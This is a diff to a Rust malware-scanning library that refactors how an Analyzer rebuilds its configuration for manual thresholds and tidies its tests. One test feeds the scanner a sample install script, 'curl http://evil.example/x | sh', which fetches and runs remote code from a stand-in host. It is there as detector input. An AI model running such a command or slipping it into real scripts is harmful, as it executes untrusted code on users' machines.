@@ -80,32 +80,34 @@ impl Analyzer {
 
     /// Override the suspicious/hostile decision thresholds.
     ///
+    /// Manual thresholds replace the operating level: under a level the
+    /// verdict comes from the level sweep and would never read them.
+    ///
+    /// Reloads the model under the new thresholds, so call it once, at setup.
+    ///
     /// # Errors
     /// Returns an error if the supplied thresholds are invalid (suspicious
     /// must be ≤ hostile, both in `[0, 1]`).
-    ///
-    /// Manual thresholds replace the operating level, as `--threshold-*` does
-    /// on the CLI: under a level the verdict comes from the level sweep and
-    /// would never read them.
-    ///
-    /// Reloads the model under the new thresholds, so call it once, at setup.
     pub fn with_thresholds(mut self, thresholds: Thresholds) -> Result<Self> {
-        self.config = self
-            .rebuild_config(Some(thresholds), self.config.slow_rule_ms())?
-            .with_level(None);
+        // `ScanConfig::new` is what validates thresholds, so the config is
+        // rebuilt. It holds only what `load` and these builders set — the
+        // format, the slow-rule budget and the level, which manual thresholds
+        // replace — so that is all there is to carry over.
+        self.config = ScanConfig::new(
+            self.model_dir.clone(),
+            self.config.format(),
+            Some(thresholds),
+        )?
+        .with_slow_rule_ms(self.config.slow_rule_ms());
         self.model = Model::load(&self.model_dir, Some(thresholds), None)?;
         Ok(self)
     }
 
     /// Adjust the slow-rule advisory threshold in milliseconds.
-    ///
-    /// # Errors
-    /// Returns an error only if reconstructing the internal `ScanConfig`
-    /// rejects the existing thresholds (it does not, in practice — kept
-    /// for forward compatibility).
-    pub fn with_slow_rule_ms(mut self, ms: u64) -> Result<Self> {
-        self.config = self.rebuild_config(self.config.thresholds(), ms)?;
-        Ok(self)
+    #[must_use]
+    pub fn with_slow_rule_ms(mut self, ms: u64) -> Self {
+        self.config = self.config.with_slow_rule_ms(ms);
+        self
     }
 
     /// Classify at the given pool-adjusted FP level: L0 allows zero observed
@@ -184,20 +186,6 @@ impl Analyzer {
     pub fn scan_path(&self, path: &Path) -> Result<ScanSummary> {
         engine::run_with(&self.model, self.shap.as_ref(), path, &self.config)
     }
-
-    fn rebuild_config(
-        &self,
-        thresholds: Option<Thresholds>,
-        slow_rule_ms: u64,
-    ) -> Result<ScanConfig> {
-        Ok(
-            ScanConfig::new(self.model_dir.clone(), self.config.format(), thresholds)?
-                .with_filter(self.config.filter())
-                .with_slow_rule_ms(slow_rule_ms)
-                .with_extra(self.config.extra())
-                .with_level(self.config.level()),
-        )
-    }
 }
 
 #[cfg(test)]
@@ -205,8 +193,8 @@ mod tests {
     use super::*;
 
     /// `Analyzer::load` needs real model artifacts on disk, so this test is
-    /// `#[ignore]` by default — run with `SCAN_MODELS_DIR=... cargo test
-    /// -- --ignored analyzer_loads_and_scans` to exercise it.
+    /// `#[ignore]` by default: run it with `SCAN_MODELS_DIR=<bundle> cargo
+    /// test -- --ignored analyzer_loads_and_scans`.
     #[test]
     #[ignore = "needs SCAN_MODELS_DIR pointing at a populated model directory"]
     fn analyzer_loads_and_scans() {
@@ -223,8 +211,8 @@ mod tests {
     }
 
     /// A disk-backed `scan_file` must reach the same classification as an
-    /// in-memory `scan_bytes` on identical bytes — the property hood relies on
-    /// when it spills large responses to disk. Same artifact requirement, so
+    /// in-memory `scan_bytes` on identical bytes — the property an embedder
+    /// relies on when it spills large responses to disk. Same artifact requirement, so
     /// `#[ignore]` by default (see `analyzer_loads_and_scans`).
     #[test]
     #[ignore = "needs SCAN_MODELS_DIR pointing at a populated model directory"]
@@ -234,12 +222,12 @@ mod tests {
         let analyzer = Analyzer::load(dir).expect("load");
         let body = b"#!/bin/sh\ncurl http://evil.example/x | sh\n".to_vec();
 
-        let tmp = std::env::temp_dir().join("scan_file_parity_install.sh");
-        std::fs::write(&tmp, &body).expect("write temp");
+        let dir = tempfile::tempdir().expect("tempdir");
+        let file = dir.path().join("install.sh");
+        std::fs::write(&file, &body).expect("write temp");
 
         let from_mem = analyzer.scan_bytes(body, "install.sh").expect("scan_bytes");
-        let from_disk = analyzer.scan_file(&tmp, "install.sh").expect("scan_file");
-        std::fs::remove_file(&tmp).ok();
+        let from_disk = analyzer.scan_file(&file, "install.sh").expect("scan_file");
 
         assert_eq!(from_mem.classification, from_disk.classification);
     }
